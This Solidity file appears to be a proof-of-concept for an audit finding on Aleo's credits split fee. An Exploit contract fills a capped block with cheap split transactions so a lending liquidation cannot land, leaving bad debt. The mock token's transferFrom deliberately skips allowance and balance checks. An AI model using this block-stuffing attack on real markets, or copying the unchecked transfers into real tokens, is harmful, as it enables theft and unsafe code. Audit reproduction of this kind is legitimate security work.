// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Aleo credits.aleo split — a single-transition split pays a hardcoded 10
    credit fee and never the congestion price (Sherlock 2024-05 aleo, H-2).
    The block cap is Transactions::MAX_TRANSACTIONS; this reduction uses 8 so
    one trace fills the block. The liquidation cannot buy a slot, the borrower
    keeps the collateral, and the full debt is left unpaid. run() does not warp. */

contract Credits {
    string public name = "credits";
    string public symbol = "ALC";
    uint8 public decimals = 6;
    address public owner;
    mapping(address => uint256) public balanceOf;

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == owner, "owner");
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SplitQueue {
    uint256 public constant SPLIT_FEE = 10_000_000;
    uint256 public constant CONGESTION_FEE = 200_000_000;
    uint256 public constant MAX_TRANSACTIONS = 8;

    Credits public credits;
    uint256 public txCount;
    uint256 public splitFeesPaid;

    constructor(Credits credits_) {
        credits = credits_;
    }

    function submitSplit(address payer) external returns (uint256 fee) {
        require(txCount < MAX_TRANSACTIONS, "full");
        fee = SPLIT_FEE;
        // @> VULN: split's fee is hardcoded to 10 credits and ignores CONGESTION_FEE
        require(credits.transferFrom(payer, address(this), fee), "fee");
        splitFeesPaid += fee;
        txCount += 1;
    }

    function submitLiquidation() external returns (bool landed) {
        if (txCount >= MAX_TRANSACTIONS) return false;
        require(credits.transferFrom(msg.sender, address(this), CONGESTION_FEE), "cong");
        txCount += 1;
        return true;
    }
}

contract Lending {
    uint256 public constant COLLATERAL = 800_000_000;
    uint256 public constant DEBT = 1_000_000_000;

    SplitQueue public queue;
    Credits public collateral;
    uint256 public badDebt;
    bool public liquidated;

    constructor(SplitQueue queue_, Credits collateral_) {
        queue = queue_;
        collateral = collateral_;
    }

    function liquidate(address to) external returns (uint256 seized) {
        bool landed = queue.submitLiquidation();
        if (!landed) {
            badDebt = DEBT;
            return 0;
        }
        liquidated = true;
        seized = COLLATERAL;
        badDebt = DEBT - COLLATERAL;
        require(collateral.transfer(to, seized), "seize");
    }

    function reclaim(address to) external returns (uint256 out) {
        require(!liquidated, "seized");
        out = collateral.balanceOf(address(this));
        require(collateral.transfer(to, out), "reclaim");
    }
}

contract Exploit {
    uint256 public constant SPLITS = 8;

    Credits public feeToken;
    Credits public collateral;
    SplitQueue public queue;
    Lending public market;
    uint256 public feesPaid;
    uint256 public congestionWouldHavePaid;
    bool public landed;
    uint256 public badDebt;
    uint256 public kept;

    constructor() {
        feeToken = new Credits();
        collateral = new Credits();
        queue = new SplitQueue(feeToken);
        market = new Lending(queue, collateral);
        feeToken.mint(address(this), queue.SPLIT_FEE() * SPLITS);
        collateral.mint(address(market), market.COLLATERAL());
    }

    function run() external {
        for (uint256 i; i < SPLITS; ++i) {
            feesPaid += queue.submitSplit(address(this));
        }
        congestionWouldHavePaid = queue.CONGESTION_FEE() * SPLITS;
        landed = market.liquidate(address(this)) != 0;
        badDebt = market.badDebt();
        kept = market.reclaim(address(this));
        require(queue.txCount() == SPLITS, "full");
        require(feesPaid == queue.SPLIT_FEE() * SPLITS, "fees");
        require(landed == false, "landed");
        require(badDebt == market.DEBT(), "debt");
        require(kept == market.COLLATERAL(), "kept");
    }
}
